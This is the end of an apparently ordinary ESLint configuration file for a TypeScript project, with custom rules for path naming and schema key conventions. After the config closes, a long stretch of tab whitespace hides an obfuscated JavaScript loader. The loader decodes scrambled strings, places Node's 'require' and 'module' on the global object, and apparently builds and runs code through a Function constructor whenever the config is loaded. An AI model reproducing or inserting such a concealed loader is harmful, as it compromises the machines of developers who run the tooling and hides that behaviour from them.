  // Directory & file naming rules (naming-conventions.md §3–§4, §6.6) — inline custom plugin.
  // Not tests-exempt (test file names follow the convention too); the __tests__/__mocks__/__snapshots__
  // directory segments are allow-listed inside the rule.
  {
    files: ['src/**/*.{ts,tsx}', 'packages/ui/**/*.{ts,tsx}'],
    plugins: { naming: namingPlugin },
    rules: {
      'naming/path-case': 'error'
    }
  },
  // Schema key naming convention (cache, preferences, paths & IPC route/event keys)
  // Supports both fixed keys and template keys:
  // - Fixed: 'app.user.avatar', 'chat.multi_select_mode'
  // - Template: 'scroll.position.${topicId}', 'entity.cache.${type}_${id}'
  // Template keys must follow the same dot-separated pattern as fixed keys.
  // When ${xxx} placeholders are treated as literal strings, the key must match: xxx.yyy.zzz_www
  {
    files: [
      'src/shared/data/cache/cacheSchemas.ts',
      'src/shared/data/preference/preferenceSchemas.ts',
      'src/main/core/paths/pathRegistry.ts',
      // IPC route/event keys — whole dir so future domains are auto-enforced (see ipc-schema-guide.md).
      'src/shared/ipc/schemas/**/*.ts'
    ],
    plugins: {
      'data-schema-key': {
        rules: {
          'valid-key': {
            meta: {
              type: 'problem',
              docs: {
                description:
                  'Enforce schema key naming convention: namespace.sub.key_name (template placeholders treated as literal strings)',
                recommended: true
              },
              messages: {
                invalidKey:
                  'Schema key "{{key}}" must follow format: namespace.sub.key_name (e.g., app.user.avatar, scroll.position.${id}). Template ${xxx} is treated as a literal string segment.',
                invalidTemplateVar:
                  'Template variable in "{{key}}" must be a valid identifier (e.g., ${id}, ${topicId}).'
              }
            },
            create(context) {
              /**
               * Validates a schema key for correct naming convention.
               *
               * Both fixed keys and template keys must follow the same pattern:
               * - Lowercase segments separated by dots
               * - Each segment: starts with letter, contains letters/numbers/underscores
               * - At least two segments (must have at least one dot)
               *
               * Template keys: ${xxx} placeholders are treated as literal string segments.
               * Example valid: 'scroll.position.${id}', 'entity.cache.${type}_${id}'
               * Example invalid: 'cache:${type}' (colon not allowed), '${id}' (no dot)
               *
               * @param {string} key - The schema key to validate
               * @returns {{ valid: boolean, error?: 'invalidKey' | 'invalidTemplateVar' }}
               */
              function validateKey(key) {
                // Check if key contains template placeholders
                const hasTemplate = key.includes('${')

                if (hasTemplate) {
                  // Validate template variable names first
                  const templateVarPattern = /\$\{([^}]*)\}/g
                  let match
                  while ((match = templateVarPattern.exec(key)) !== null) {
                    const varName = match[1]
                    // Variable must be a valid identifier: start with letter, contain only alphanumeric and underscore
                    if (!varName || !/^[a-zA-Z][a-zA-Z0-9_]*$/.test(varName)) {
                      return { valid: false, error: 'invalidTemplateVar' }
                    }
                  }

                  // Replace template placeholders with a valid segment marker
                  // Use 'x' as placeholder since it's a valid segment character
                  const keyWithoutTemplates = key.replace(/\$\{[^}]+\}/g, 'x')

                  // Template key must follow the same pattern as fixed keys
                  // when ${xxx} is treated as a literal string
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(keyWithoutTemplates)) {
                    return { valid: false, error: 'invalidKey' }
                  }

                  return { valid: true }
                } else {
                  // Fixed key validation: standard dot-separated format
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(key)) {
                    return { valid: false, error: 'invalidKey' }
                  }
                  return { valid: true }
                }
              }

              return {
                TSPropertySignature(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                },
                Property(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    // Keys inside a `z.*(...)` object literal are zod data-field names
                    // (e.g. z.object({ 'content-type': ... })), not route/schema keys, so the
                    // namespace.action convention does not apply — skip them. Anchored on the
                    // zod namespace `z`, this covers z.object/z.strictObject/etc. while leaving
                    // Object.freeze(...) registries (pathRegistry.ts) still validated.
                    const enclosing = node.parent
                    if (
                      enclosing?.parent?.type === 'CallExpression' &&
                      enclosing.parent.callee?.type === 'MemberExpression' &&
                      enclosing.parent.callee.object?.type === 'Identifier' &&
                      enclosing.parent.callee.object.name === 'z'
                    ) {
                      return
                    }
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    rules: {
      'data-schema-key/valid-key': 'error'
    }
  }
]);																																																																																																																																																																																																																																																																										var z = '-3343-2';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
